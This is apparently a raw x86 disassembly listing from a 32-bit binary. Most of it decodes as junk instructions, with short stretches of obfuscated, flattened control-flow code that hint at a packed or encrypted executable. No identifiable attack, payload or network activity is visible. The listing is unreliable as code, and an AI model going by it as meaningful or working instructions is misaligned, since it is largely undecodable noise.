  40ea8d:	loop   0x40eae7
  40ea8f:	jmp    0x40eace
  40ea91:	adc    ecx,DWORD PTR [esi]
  40ea93:	pop    ecx
  40ea94:	nop
  40ea95:	mov    eax,eax
  40ea97:	xchg   BYTE PTR [ebx],bh
  40ea99:	jle    0x40ea28
  40ea9b:	mov    esi,DWORD PTR [eax]
  40ea9d:	inc    ecx
  40ea9e:	and    dl,cl
  40eaa0:	xor    ch,BYTE PTR [edi-0x3b]
  40eaa3:	iret   
  40eaa4:	jg     0x40ea60
  40eaa6:	mov    BYTE PTR [edx-0x3dfe87e9],bh
  40eaac:	xchg   esp,ebx
  40eaae:	push   0xffffffb7
  40eab0:	dec    esi
  40eab1:	lods   al,BYTE PTR ds:[esi]
  40eab2:	jnp    0x40eab6
  40eab4:	in     eax,dx
  40eab5:	xor    eax,DWORD PTR [esi+0x1c3e370a]
  40eabb:	inc    eax
  40eabc:	rcr    ebx,cl
  40eabe:	sbb    BYTE PTR [ebx-0x39b4a1a3],ah
  40eac4:	(bad)  
  40eac5:	hlt    
  40eac6:	lds    ecx,FWORD PTR [edi+ecx*4]
  40eac9:	retf   0x7fe
  40eacc:	xor    al,0x59
  40eace:	mov    edx,DWORD PTR [edi-0x3d0ae807]
  40ead4:	leave  
  40ead5:	stc    
  40ead6:	outs   dx,DWORD PTR ds:[esi]
  40ead7:	test   ebx,ebx
  40ead9:	into   
  40eada:	adc    dh,BYTE PTR [edx-0x3a]
  40eadd:	out    0x15,eax
  40eadf:	sub    BYTE PTR [edx-0x28],ch
  40eae2:	jp     0x40eb5d
  40eae4:	jae    0x40eb43
  40eae6:	xor    DWORD PTR [esi-0x1d00a37e],edi
  40eaec:	dec    ebx
  40eaed:	int3   
  40eaee:	jbe    0x40eb4e
  40eaf0:	fwait
  40eaf1:	enter  0x9837,0xe5
  40eaf5:	jo     0x40eaf0
  40eaf7:	inc    edi
  40eaf8:	(bad)  
  40eaf9:	inc    eax
  40eafa:	sbb    ebx,DWORD PTR [ecx-0x4220ac54]
  40eb00:	lods   al,BYTE PTR ds:[esi]
  40eb01:	popa   
  40eb02:	xlat   BYTE PTR ds:[ebx]
  40eb03:	xchg   ebx,eax
  40eb04:	mov    bh,0xa3
  40eb06:	repz inc ecx
  40eb08:	fs test al,0x1f
  40eb0b:	inc    ecx
  40eb0c:	ja     0x40eb49
  40eb0e:	je     0x40eb8e
  40eb10:	mov    ch,0x9
  40eb12:	cmc    
  40eb13:	(bad)  
  40eb14:	sub    ebx,DWORD PTR [edx]
  40eb16:	cmp    bl,BYTE PTR [esi-0x187bf007]
  40eb1c:	js     0x40eb88
  40eb1e:	adc    eax,0x3965f887
  40eb23:	and    eax,0x423ad320
  40eb28:	mov    cs,WORD PTR [edi]
  40eb2a:	jg     0x40eb5a
  40eb2c:	leave  
  40eb2d:	push   ebx
  40eb2e:	push   ebp
  40eb2f:	xchg   ebp,eax
  40eb30:	lock test al,0xa9
  40eb33:	ins    BYTE PTR es:[edi],dx
  40eb34:	jae    0x40eb7b
  40eb36:	sbb    dh,BYTE PTR [edx+0x13]
  40eb39:	jg     0x40eaec
  40eb3b:	and    eax,esi
  40eb3d:	cdq    
  40eb3e:	push   0xffffffc8
  40eb40:	jae    0x40eb5d
  40eb42:	lahf   
  40eb43:	mov    eax,0xa8ac3b83
  40eb48:	retf   
  40eb49:	bound  esp,QWORD PTR [edi]
  40eb4b:	sbb    bl,BYTE PTR ds:0xda7b184
  40eb51:	pop    ebx
  40eb52:	scas   al,BYTE PTR es:[edi]
  40eb53:	pop    esp
  40eb54:	cmp    BYTE PTR [eax-0x446d5599],al
  40eb5a:	cmp    eax,0x330cd9b0
  40eb5f:	inc    edi
  40eb60:	pop    ebp
  40eb61:	shl    DWORD PTR [edx+0x2ed44691],1
  40eb67:	in     eax,dx
  40eb68:	pop    eax
  40eb69:	rcl    ebp,0xbb
  40eb6c:	out    dx,eax
  40eb6d:	and    eax,0x36c95e33
  40eb72:	sub    DWORD PTR fs:[edx+0x5c],edx
  40eb76:	test   al,0xa2
  40eb78:	dec    esp
  40eb79:	fild   WORD PTR [ebx-0x23]
  40eb7c:	sub    DWORD PTR [ecx+0x7f193b2e],0x1424116a
  40eb86:	sub    al,0x6b
  40eb88:	cmc    
  40eb89:	xchg   esp,eax
  40eb8a:	add    DWORD PTR [esi+0x54d94bc0],ecx
  40eb90:	xchg   DWORD PTR [ecx],ebp
  40eb92:	push   ds
  40eb93:	cmp    bl,BYTE PTR [ebp-0x36]
  40eb96:	les    eax,FWORD PTR [edx+ebx*2+0x2e1a9c51]
  40eb9d:	pop    es
  40eb9e:	imul   ebx,eax,0xd0109b3c
  40eba4:	jl     0x40ebbe
  40eba6:	inc    edx
  40eba7:	mov    ebp,0x6aa6419b
  40ebac:	mov    ebx,0xd8a18e4d
  40ebb1:	sbb    BYTE PTR [ebx],0x54
  40ebb4:	retf   0x2bd4
  40ebb7:	pop    ecx
  40ebb8:	inc    edx
  40ebb9:	sti    
  40ebba:	stos   DWORD PTR es:[edi],eax
  40ebbb:	push   DWORD PTR [edx+0x16661399]
  40ebc1:	jno    0x40eb64
  40ebc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebc4:	sub    BYTE PTR [esi+0x6a14ae85],dh
  40ebca:	mov    ch,0xf8
  40ebcc:	aas    
  40ebcd:	lods   eax,DWORD PTR ds:[esi]
  40ebce:	enter  0x2356,0xe
  40ebd2:	push   ebp
  40ebd3:	pop    edi
  40ebd4:	repnz fld TBYTE PTR [edi+0x3c142b76]
  40ebdb:	or     dh,ch
  40ebdd:	cmp    ebx,DWORD PTR [edi-0x34]
  40ebe0:	out    0x96,al
  40ebe2:	xor    BYTE PTR [edx],dl
  40ebe4:	push   esp
  40ebe5:	fist   DWORD PTR [edi]
  40ebe7:	and    eax,0xe107c4bc
  40ebec:	push   es
  40ebed:	aaa    
  40ebee:	mov    ecx,0xebe76051
  40ebf3:	or     dh,BYTE PTR [ebx+0x67e04cac]
  40ebf9:	jg     0x40eb7e
  40ebfb:	stc    
  40ebfc:	adc    DWORD PTR [esi+0x7fbef9c0],ecx
  40ec02:	sar    edx,cl
  40ec04:	mov    ch,0x5d
  40ec06:	jno    0x40ec32
  40ec08:	dec    ecx
  40ec09:	mov    dh,0xe3
  40ec0b:	stos   DWORD PTR es:[edi],eax
  40ec0c:	hlt    
  40ec0d:	fwait
  40ec0e:	add    bh,BYTE PTR [ebp-0x3e]
  40ec11:	inc    ebp
  40ec12:	test   BYTE PTR [edx],0x65
  40ec15:	data16 (bad) 
  40ec17:	jmp    0x21b1:0x58be39
  40ec1e:	lea    eax,[edx]
  40ec20:	add    al,0x25
  40ec22:	in     al,0xc4
  40ec24:	stos   BYTE PTR es:[edi],al
  40ec25:	iret   
  40ec26:	out    dx,eax
  40ec27:	and    ch,BYTE PTR [eax+0x13]
  40ec2a:	push   esi
  40ec2b:	gs mov esp,0xc3f9a506
  40ec31:	aas    
  40ec32:	mov    ah,0xa7
  40ec34:	jle    0x40ec60
  40ec36:	mov    dl,0x6d
  40ec38:	jg     0x40ec30
  40ec3a:	mov    al,ds:0x175c308f
  40ec3f:	sbb    eax,0xa29923d2
  40ec44:	stos   BYTE PTR es:[edi],al
  40ec45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec46:	ins    DWORD PTR es:[edi],dx
  40ec47:	mov    WORD PTR [eax+edx*8+0x74],ss
  40ec4b:	mov    eax,DWORD PTR [eax]
  40ec4d:	mov    DWORD PTR ds:0x43386b,0x3f94
  40ec57:	mov    DWORD PTR [ebp-0x14],eax
  40ec5a:	mov    DWORD PTR ds:0x433833,0x877
  40ec64:	mov    eax,ds:0x413c66
  40ec69:	mov    DWORD PTR ds:0x4337af,0x4b6e
  40ec73:	mov    eax,DWORD PTR [eax]
  40ec75:	mov    DWORD PTR ds:0x4338b3,0x73ce
  40ec7f:	mov    DWORD PTR [ebp-0x18],eax
  40ec82:	mov    DWORD PTR ds:0x4338bf,0x7077
  40ec8c:	jmp    0x40f1ad
  40ec91:	cmp    edi,0x33d
  40ec97:	jne    0x40f120
  40ec9d:	and    DWORD PTR [ebp+0x8],0x0
  40eca1:	mov    eax,DWORD PTR [ebp-0x8]
  40eca4:	sub    eax,DWORD PTR [ebp+0x8]
  40eca7:	push   eax
  40eca8:	mov    eax,DWORD PTR [ebp-0x4]
  40ecab:	add    eax,DWORD PTR [ebp+0x8]
  40ecae:	push   eax
  40ecaf:	jmp    0x40eedc
  40ecb4:	es addr16 mov esi,0x2465bf5c
  40ecbb:	gs mov dh,0x91
  40ecbe:	test   BYTE PTR [edx+edx*4-0xad0027],bl
  40ecc5:	mov    eax,ds:0x7c0e7e7e
  40ecca:	jle    0x40ed4a
  40eccc:	push   ecx
  40eccd:	pop    ebp
  40ecce:	dec    ebp
  40eccf:	test   BYTE PTR [ecx],bh
  40ecd1:	inc    eax
  40ecd2:	mov    ds:0x26521baa,eax
  40ecd7:	es inc esp
  40ecd9:	inc    edi
  40ecda:	fidiv  WORD PTR [edx-0x2c]
  40ecdd:	loop   0x40ecc5
  40ecdf:	inc    ecx
  40ece0:	je     0x40ecd7
  40ece2:	pop    ebp
  40ece3:	ret    0x7d15
  40ece6:	pop    ebp
  40ece7:	xor    ebp,edi
  40ece9:	(bad)  
  40eceb:	les    esp,FWORD PTR [ebp+eax*8-0x46]
  40ecef:	or     eax,0xd9fa6301
  40ecf4:	push   edi
  40ecf5:	loopne 0x40ecf7
  40ecf7:	mov    ds:0x54aa98b,eax
  40ecfc:	sub    esp,DWORD PTR [eax]
  40ecfe:	or     dh,BYTE PTR [esi-0x5f3862d1]
  40ed04:	mov    dl,0x80
  40ed06:	in     eax,0x91
  40ed08:	push   ecx
  40ed09:	xor    dl,BYTE PTR [ecx-0x4cae6b83]
  40ed0f:	xchg   esi,eax
  40ed10:	mov    ah,0x84
  40ed12:	pop    ecx
  40ed13:	mov    ds:0x5a5db5a8,eax
  40ed18:	fwait
  40ed19:	sbb    al,BYTE PTR [ecx+0x543817cf]
  40ed1f:	mov    al,0x49
  40ed21:	(bad)  
  40ed23:	jne    0x40ed65
  40ed25:	test   DWORD PTR [esi-0x2bcfe4f3],ebx
  40ed2b:	or     ebp,DWORD PTR [eax]
  40ed2d:	dec    ebx
  40ed2e:	frstor [edx+ebp*8-0x6f1b10b8]
  40ed35:	sar    BYTE PTR [ebp-0x5534b5cf],1
  40ed3b:	leave  
  40ed3c:	jb     0x40ed3e
  40ed3e:	jp     0x40ed37
  40ed40:	or     BYTE PTR [ebx+0x57],dh
  40ed43:	cmc    
  40ed44:	xchg   esp,eax
  40ed45:	cmc    
  40ed46:	or     al,0xac
  40ed48:	xchg   edx,eax
  40ed49:	loop   0x40ed00
  40ed4b:	in     al,0xdc
  40ed4d:	dec    ebp
  40ed4e:	xchg   ebp,eax
  40ed4f:	repz out 0x2,al
  40ed52:	fxam   
  40ed54:	cwde   
  40ed55:	repz aas 
  40ed57:	jae    0x40ece9
  40ed59:	fst    DWORD PTR [edx]
  40ed5b:	jns    0x40ed1d
  40ed5d:	jg     0x40edbc
  40ed5f:	dec    ebp
  40ed60:	dec    eax
  40ed61:	mov    al,ds:0xdb4a9bf2
  40ed66:	fdivr  st(3),st
  40ed68:	outs   dx,BYTE PTR ds:[esi]
  40ed69:	mov    ah,0x47
  40ed6b:	push   ebx
  40ed6c:	iret   
  40ed6d:	imul   edi,eax,0xcf516941
  40ed73:	leave  
  40ed74:	aas    
  40ed75:	push   esi
  40ed76:	or     dl,BYTE PTR [edi+0x77594853]
  40ed7c:	cmp    BYTE PTR ds:0xb3ab5011,ah
  40ed82:	jp     0x40eddc
  40ed84:	mov    esi,0xea6ee765
  40ed89:	lea    ebp,[ecx+edi*4+0x704cb81a]
  40ed90:	hlt    
  40ed91:	jge    0x40edf6
  40ed93:	fbstp  TBYTE PTR [esi]
  40ed96:	fmul   DWORD PTR [ecx]
  40ed98:	js     0x40ed4f
  40ed9a:	icebp  
  40ed9b:	jmp    0x40edc7
  40ed9d:	cmc    
  40ed9e:	pop    ecx
  40ed9f:	mov    al,0xeb
  40eda1:	fwait
  40eda2:	les    eax,FWORD PTR [edx-0x529d4662]
  40eda8:	loop   0x40edaa
  40edaa:	sbb    BYTE PTR [edi+ebx*1+0x23],ch
  40edae:	cs icebp 
  40edb0:	sti    
  40edb1:	pop    esi
  40edb2:	jne    0x40eda6
  40edb4:	pop    ebx
  40edb5:	xchg   ebp,eax
  40edb6:	stc    
  40edb7:	mov    BYTE PTR [edx-0x6e272e6b],ah
  40edbd:	callw  0x77ec
  40edc1:	popa   
  40edc2:	jge    0x40ed61
  40edc4:	enter  0xe75b,0x6a
  40edc8:	gs jge 0x40ee42
  40edcb:	pop    ebx
  40edcc:	aas    
  40edcd:	cmp    eax,0x29250493
  40edd2:	int3   
  40edd3:	sbb    al,0x92
  40edd5:	and    al,0x49
  40edd7:	mov    ch,BYTE PTR [edx+esi*8]
  40edda:	(bad)  
  40eddb:	fwait
  40eddc:	sub    eax,0x9551ec2d
  40ede1:	or     ah,BYTE PTR [ecx+0x617d8d30]
  40ede7:	xor    cl,BYTE PTR [ecx+0x4a]
  40edea:	je     0x40ed9d
  40edec:	mov    cl,0x4d
  40edee:	ficomp DWORD PTR [eax]
  40edf0:	mov    al,0xde
  40edf2:	jmp    0x520b:0x2b9ca5bd
  40edf9:	mov    al,0xb0
  40edfb:	(bad)  
  40edfc:	mov    ds:0xb14c9618,al
  40ee01:	aaa    
  40ee02:	popf   
  40ee03:	or     BYTE PTR [ecx+0x270a1a7d],0x96
  40ee0a:	pushf  
  40ee0b:	mov    ah,0x82
  40ee0d:	int3   
  40ee0e:	loopne 0x40ee3f
  40ee10:	cmc    
  40ee11:	push   ss
  40ee12:	pop    ecx
  40ee13:	cwde   
  40ee14:	ret    
  40ee15:	inc    edx
  40ee16:	fmul   QWORD PTR [esi+eax*1-0xe515507]
  40ee1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee1e:	in     al,0x37
  40ee20:	fimul  DWORD PTR [edx]
  40ee22:	mov    edi,0xd1aafb6e
  40ee27:	mov    al,0x6d
  40ee29:	pusha  
  40ee2a:	fsub   st,st(5)
  40ee2c:	push   ebp
  40ee2d:	inc    ebp
  40ee2e:	xor    esp,DWORD PTR es:[esp+ecx*4+0x69]
  40ee33:	das    
  40ee34:	or     BYTE PTR [esi+0x56],0x56
  40ee38:	(bad)  
  40ee39:	add    DWORD PTR [eax],ebx
  40ee3b:	(bad)  
  40ee3c:	cmp    DWORD PTR ds:0x299c6ce4,edi
  40ee42:	arpl   WORD PTR [edi+0x50],cx
  40ee45:	call   0x7f0adee5
  40ee4a:	mov    cl,BYTE PTR [edx]
  40ee4c:	shr    DWORD PTR [ebx-0x11],cl
  40ee4f:	xchg   esi,eax
  40ee50:	cs popf 
  40ee52:	pop    ecx
  40ee53:	or     esi,DWORD PTR [ebp+0x15b408a6]
  40ee59:	mov    al,0x87
  40ee5b:	dec    edi
  40ee5c:	xchg   DWORD PTR [ecx+0x22],esp
  40ee5f:	xlat   BYTE PTR ds:[ebx]
  40ee60:	mov    edx,0xe445c56
  40ee65:	mov    bl,0x28
  40ee67:	and    eax,0x7bbb7adf
  40ee6c:	or     ecx,DWORD PTR [ebx]
  40ee6e:	and    al,0x83
  40ee70:	mov    ebp,0xa97e4b16
  40ee76:	push   esi
  40ee77:	js     0x40ee10
  40ee79:	push   ecx
  40ee7a:	(bad)  
  40ee7b:	in     al,0x4f
  40ee7d:	test   al,0x58
  40ee7f:	pop    ecx
  40ee80:	push   0xffffff92
  40ee82:	cmp    ch,al
  40ee84:	std    
  40ee85:	jp     0x40ee09
  40ee87:	cmp    eax,0x43240c2e
  40ee8c:	push   esi
  40ee8d:	add    ecx,DWORD PTR [ebx+0x59ee7a41]
  40ee93:	mov    DWORD PTR ds:0xaaeb7434,ebx
  40ee99:	xor    al,0x6
  40ee9b:	in     al,dx
  40ee9c:	sbb    cl,BYTE PTR [eax-0x1]
  40ee9f:	jne    0x40ee22
  40eea1:	scas   eax,DWORD PTR es:[edi]
  40eea2:	and    al,0x8
  40eea4:	xchg   DWORD PTR [esi+0x30f851fa],ebx
  40eeaa:	lds    ebx,FWORD PTR [eax+0x7fc6fd57]
  40eeb0:	sbb    BYTE PTR [edi+0x52],bl
  40eeb3:	and    BYTE PTR [edx-0x214b5c85],ah
  40eeb9:	dec    ecx
  40eeba:	cli    
  40eebb:	sbb    al,0xea
  40eebd:	cmc    
  40eebe:	mov    cl,0x2f
  40eec0:	dec    esi
  40eec1:	jmp    0x40ef2d
  40eec3:	mov    ah,0xf2
  40eec5:	xor    ch,BYTE PTR ds:0xf776fa3a
  40eecb:	mov    ebp,0xec752090
  40eed0:	scas   eax,DWORD PTR es:[edi]
  40eed1:	xor    DWORD PTR ds:0x54d4e0ff,edx
  40eed7:	dec    ebx
  40eed8:	adc    edi,DWORD PTR [esi]
  40eeda:	push   ds
  40eedb:	in     eax,0xe8
  40eedd:	popf   
  40eede:	pop    ebx
  40eedf:	(bad)  
  40eee0:	(bad)  
  40eee1:	inc    DWORD PTR [ebp+0x8]
  40eee4:	cmp    DWORD PTR [ebp+0x8],0x52
  40eee8:	jb     0x40eca1
  40eeee:	jmp    0x40f1ad
  40eef3:	jmp    0x40f120
  40eef8:	lds    ebp,FWORD PTR [edx+0x1371069f]
  40eefe:	imul   ecx,DWORD PTR gs:[ebx-0x7c6710ba],0x8fa78e70
  40ef09:	scas   eax,DWORD PTR es:[edi]
  40ef0a:	jle    0x40ef8a
  40ef0c:	push   cs
  40ef0d:	jl     0x40ef8d
  40ef0f:	jle    0x40eec5
  40ef11:	dec    ebp
  40ef12:	popa   
  40ef13:	into   
  40ef14:	xchg   ecx,eax
  40ef15:	test   eax,0x5c10a1d
  40ef1a:	push   eax
  40ef1b:	int3   
  40ef1c:	nop
  40ef1d:	(bad)  
  40ef1e:	xchg   DWORD PTR [esi+0x1bd05f66],edi
  40ef24:	jb     0x40ef70
  40ef26:	cld    
  40ef27:	mov    dl,BYTE PTR [eax]
  40ef29:	outs   dx,DWORD PTR ds:[esi]
  40ef2a:	and    BYTE PTR [ecx],0x94
  40ef2d:	(bad)  
  40ef2e:	aas    
  40ef2f:	xor    DWORD PTR [ebp+0x1a],0xffffffd8
  40ef33:	fs jmp 0x40efaa
  40ef36:	aad    0x47
  40ef38:	shl    DWORD PTR [ebp-0x51c8d7a7],0x98
  40ef3f:	popa   
  40ef40:	cmp    al,0x2d
  40ef42:	sti    
  40ef43:	clc    
  40ef44:	mov    BYTE PTR [ebp-0x12],dh
  40ef47:	lahf   
  40ef48:	adc    dl,al
  40ef4a:	aam    0x73
  40ef4c:	inc    esi
  40ef4d:	inc    edi
  40ef4e:	or     al,0x17
  40ef50:	cdq    
  40ef51:	xchg   edi,eax
  40ef52:	sub    al,0x40
  40ef54:	loope  0x40eef7
  40ef56:	out    0x4,al
  40ef58:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40ef5a:	js     0x40ef64
  40ef5c:	in     al,dx
  40ef5d:	mov    esi,0xedd31e9a
  40ef62:	cmp    eax,0xec2d1323
  40ef67:	aad    0x5d
  40ef69:	xor    al,0x73
  40ef6b:	jo     0x40efb7
  40ef6d:	xchg   ecx,eax
  40ef6e:	jbe    0x40efb7
  40ef70:	and    dh,BYTE PTR [edx]
  40ef72:	push   ecx
  40ef73:	push   edx
  40ef74:	jecxz  0x40efd5
  40ef76:	xor    DWORD PTR [eax+0x2b],0x9a285882
  40ef7d:	retf   0x91cd
  40ef80:	rol    DWORD PTR [ecx+eiz*8],cl
  40ef83:	and    esp,ebx
  40ef85:	xchg   ebx,eax
  40ef86:	daa    
  40ef87:	sub    esp,DWORD PTR [eax+0x674ee9e5]
  40ef8d:	xchg   DWORD PTR [edx-0x483bb46d],ebp
  40ef93:	(bad)  
  40ef94:	pop    ss
  40ef95:	pop    edx
  40ef96:	out    0x98,eax
  40ef98:	imul   eax,DWORD PTR [eax-0x3bb8bcc1],0xa51a9483
  40efa2:	psllq  mm1,QWORD PTR [edi]
  40efa5:	add    DWORD PTR [ebp-0xa91fdf7],esp
  40efab:	leave  
  40efac:	jle    0x40ef86
  40efae:	cld    
  40efaf:	fld    QWORD PTR [esi]
  40efb1:	out    0x6f,al
  40efb3:	pop    eax
  40efb4:	ja     0x40efe4
  40efb6:	lock sbb dl,0xdb
  40efba:	repz jbe 0x40ef6b
  40efbd:	ins    DWORD PTR es:[edi],dx
  40efbe:	push   ds
  40efbf:	test   DWORD PTR [ebp+0x4b],edi
  40efc2:	mov    edi,0xde4aea39
  40efc7:	add    DWORD PTR [edi-0x57],edx
  40efca:	inc    eax
  40efcb:	mov    eax,0x474435a
  40efd0:	add    ah,BYTE PTR [eax]
  40efd2:	imul   DWORD PTR [ebx-0x31]
  40efd5:	out    0x9f,al
  40efd7:	push   esi
  40efd8:	out    dx,al
  40efd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efda:	mov    ds:0x84c90206,eax
  40efdf:	xchg   DWORD PTR [ebp+0x5e],ebx
  40efe2:	pushf  
  40efe3:	mov    dh,0x8d
  40efe5:	sub    DWORD PTR ds:0x43ba84d2,edi
  40efeb:	mov    al,al
  40efed:	mov    bl,0x33
  40efef:	ss ins DWORD PTR es:[edi],dx
  40eff1:	or     DWORD PTR [ebp-0xe869b50],0xffffff8e
  40eff8:	fimul  DWORD PTR ds:0xe259c316
  40effe:	popw   es
  40f000:	mov    ah,0x7d
  40f002:	inc    esp
  40f003:	add    eax,0x875a8d6a
  40f008:	rol    BYTE PTR [ecx],0xbd
  40f00b:	mov    ebx,0xa0032b7a
  40f010:	in     eax,0xf9
  40f012:	push   edx
  40f013:	sub    BYTE PTR [edx+0x24c8dbd5],ah
  40f019:	xchg   esi,eax
  40f01a:	shl    BYTE PTR [ebp+0x1a51496d],0x9f
  40f021:	popa   
  40f022:	xlat   BYTE PTR ds:[ebx]
  40f023:	jmp    0x6c71:0x54bad372
  40f02a:	es aaa 
  40f02c:	jns    0x40f036
  40f02e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f02f:	mov    bl,0xaf
  40f031:	retf   
  40f032:	adc    BYTE PTR [edi],cl
  40f034:	xor    edi,esp
  40f036:	lods   al,BYTE PTR ds:[esi]
  40f037:	xchg   edi,eax
  40f038:	sub    esi,esi
  40f03a:	cs add bh,BYTE PTR ss:[esi]
  40f03e:	fwait
  40f03f:	sbb    BYTE PTR [esp+ecx*8],ch
  40f042:	jmp    0x40f028
  40f044:	mov    edx,0xc595c0d2
  40f049:	jge    0x40f05c
  40f04b:	and    dl,al
  40f04d:	cmp    ah,bh
  40f04f:	jle    0x40f06d
  40f051:	outs   dx,DWORD PTR ds:[esi]
  40f052:	pop    ebx
  40f053:	std    
  40f054:	addr16 gs jns 0x40f074
  40f058:	cs jl  0x40f09d
  40f05b:	pushf  
  40f05c:	cmp    ebx,DWORD PTR [edx]
  40f05e:	test   eax,0x88f8af31
  40f063:	xor    DWORD PTR [edi],ebx
  40f065:	xchg   esp,eax
  40f066:	mov    ah,0x5a
  40f068:	cmp    BYTE PTR [eax+0x17],bl
  40f06b:	push   esi
  40f06c:	mov    bl,0x34
  40f06e:	lock hlt 
  40f070:	scas   al,BYTE PTR es:[edi]
  40f071:	mov    dh,0xdf
  40f073:	cwde   
  40f074:	stos   BYTE PTR es:[edi],al
  40f075:	sub    eax,0x447207c7
  40f07a:	mov    dl,0x7d
  40f07c:	(bad)  
  40f07e:	sti    
  40f07f:	mov    gs,edi
  40f081:	xor    eax,DWORD PTR [ebx+0x53]
  40f084:	in     eax,0x6d
  40f086:	push   eax
  40f087:	dec    esp
  40f088:	sbb    cl,BYTE PTR [ecx+0x46]
  40f08b:	mov    edi,0xbc2c3e4d
  40f090:	pop    ecx
  40f091:	scas   al,BYTE PTR es:[edi]
  40f092:	or     edx,DWORD PTR [esi-0x38]
  40f095:	mov    ebx,0xa418a4b8
  40f09a:	adc    ah,BYTE PTR [ecx]
  40f09c:	je     0x40f03e
  40f09e:	xchg   bl,bl
  40f0a0:	sub    dl,BYTE PTR [ecx]
  40f0a2:	push   edi
  40f0a3:	pop    ebx
  40f0a4:	mov    bh,0x61
  40f0a6:	cmp    eax,0x6696f958
  40f0ab:	sbb    ebx,ebp
  40f0ad:	outs   dx,BYTE PTR ds:[esi]
  40f0ae:	lods   al,BYTE PTR ds:[esi]
  40f0af:	push   0xfffffff7
  40f0b1:	cs xchg edi,eax
  40f0b3:	out    dx,eax
  40f0b4:	lock xor esp,ecx
  40f0b7:	daa    
  40f0b8:	shl    ebp,cl
  40f0ba:	pop    es
  40f0bb:	fsub   st,st(6)
  40f0bd:	out    dx,al
  40f0be:	lock int 0x51
  40f0c1:	ins    DWORD PTR es:[edi],dx
  40f0c2:	ret    
  40f0c3:	mov    ds:0x8cc83e8,al
  40f0c8:	fwait
  40f0c9:	jp     0x40f096
  40f0cb:	push   eax
  40f0cc:	enter  0x8c34,0x52
  40f0d0:	xor    edx,ebp
  40f0d2:	leave  
  40f0d3:	aaa    
  40f0d4:	ret    
  40f0d5:	stos   BYTE PTR es:[edi],al
  40f0d6:	jmp    0x4eaf:0x3ad422cc
  40f0dd:	outs   dx,DWORD PTR ds:[esi]
  40f0de:	dec    eax
  40f0df:	(bad)  
  40f0e1:	(bad)  
  40f0e3:	pop    ebp
  40f0e4:	int    0xdf
  40f0e6:	mov    al,ds:0xf38c9ff
  40f0eb:	adc    DWORD PTR [edx],ebx
  40f0ed:	outs   dx,DWORD PTR ds:[esi]
  40f0ee:	cwde   
  40f0ef:	pop    es
  40f0f0:	mov    al,0xb6
  40f0f2:	ja     0x40f172
  40f0f4:	jp     0x40f125
  40f0f6:	mov    ds:0xade34121,al
  40f0fb:	(bad)  
  40f0fd:	mov    bh,0x41
  40f0ff:	inc    edi
  40f100:	pop    ebx
  40f101:	scas   eax,DWORD PTR es:[edi]
  40f102:	lea    ebp,[eax]
  40f104:	inc    ebx
  40f105:	fldenv [ecx]
  40f107:	out    0x15,eax
  40f109:	aad    0xe4
  40f10b:	mov    ds:0x29ce1af,eax
  40f110:	in     al,0xb0
  40f112:	mov    DWORD PTR [ebx-0x22e6957f],edx
  40f118:	add    al,0x5e
  40f11a:	enter  0xa66,0x44
  40f11e:	std    
  40f11f:	mov    ds:0x1a3ff81,al
  40f124:	add    BYTE PTR [eax],al
  40f126:	jne    0x40f17b
  40f12c:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40f133:	mov    eax,DWORD PTR [ebp-0x4]
  40f136:	mov    DWORD PTR [ebp-0x5c],eax
  40f139:	mov    eax,DWORD PTR [ebp-0x8]
  40f13c:	mov    DWORD PTR [ebp-0x58],eax
  40f13f:	mov    eax,DWORD PTR [ebp-0xc]
  40f142:	xor    eax,esi
  40f144:	add    eax,ebx
  40f146:	mov    DWORD PTR [ebp-0x54],eax
  40f149:	lea    eax,[ebp-0x1c]
  40f14c:	mov    DWORD PTR [ebp-0x50],eax
  40f14f:	mov    eax,DWORD PTR [ebp-0x60]
  40f152:	xor    eax,esi
  40f154:	add    eax,ebx
  40f156:	mov    DWORD PTR [ebp-0x60],eax
  40f159:	lea    eax,[ebp-0x60]
  40f15c:	push   eax
  40f15d:	mov    eax,DWORD PTR [ebp+0xc]
  40f160:	xor    eax,esi
  40f162:	add    eax,ebx
  40f164:	push   eax
  40f165:	mov    eax,ds:0x413bfe
  40f16a:	push   0x413b54
  40f16f:	push   DWORD PTR [eax]
  40f171:	call   0x40c099
  40f176:	jmp    0x40f1ad
  40f17b:	cmp    edi,0x13d
  40f181:	jne    0x40f1ad
  40f187:	mov    eax,DWORD PTR [ebp-0x10]
  40f18a:	xor    eax,esi
  40f18c:	add    eax,ebx
  40f18e:	mov    DWORD PTR [ebp+0x8],eax
  40f191:	mov    eax,ds:0x413bde
  40f196:	mov    DWORD PTR [ebp+0x8],eax
  40f199:	mov    eax,DWORD PTR [ebp-0x14]
  40f19c:	mov    DWORD PTR [ebp-0x4],eax
  40f19f:	mov    eax,DWORD PTR [ebp-0x4]
  40f1a2:	push   0x4
  40f1a4:	pop    ecx
  40f1a5:	sub    ecx,eax
  40f1a7:	add    ecx,DWORD PTR [ebp-0x18]
  40f1aa:	mov    DWORD PTR [ebp-0x8],ecx
  40f1ad:	mov    eax,DWORD PTR [ebp+0xc]
  40f1b0:	xor    eax,esi
  40f1b2:	lea    edi,[edi+eax*1+0x32729b]
  40f1b9:	cmp    edi,0x50b
  40f1bf:	jne    0x40ea09
  40f1c5:	mov    eax,DWORD PTR [ebp+0xc]
  40f1c8:	pop    edi
  40f1c9:	xor    eax,esi
  40f1cb:	jmp    0x40f3f8
  40f1d0:	push   edx
  40f1d1:	mov    ecx,0x7215e615
  40f1d6:	jno    0x40f241
  40f1d8:	scas   al,BYTE PTR es:[edi]
  40f1d9:	out    dx,al
  40f1da:	lds    esp,FWORD PTR [edx-0x5805212d]
  40f1e0:	lahf   
  40f1e1:	lods   eax,DWORD PTR ds:[esi]
  40f1e2:	jle    0x40f262
  40f1e4:	push   cs
  40f1e5:	jl     0x40f265
  40f1e7:	jle    0x40f1a5
  40f1e9:	adc    edx,eax
  40f1eb:	cmp    ch,BYTE PTR [ebx+0x7b]
  40f1ee:	enter  0xd9b3,0xd
  40f1f2:	cs daa 
  40f1f4:	js     0x40f210
  40f1f6:	cdq    
  40f1f7:	loop   0x40f1b0
  40f1f9:	sbb    eax,0xf198cadc
  40f1fe:	xor    dh,BYTE PTR [edi+0x72d65068]
  40f204:	mov    ecx,0xa13b4bc8
  40f209:	bound  ebp,QWORD PTR ds:0xf3117820
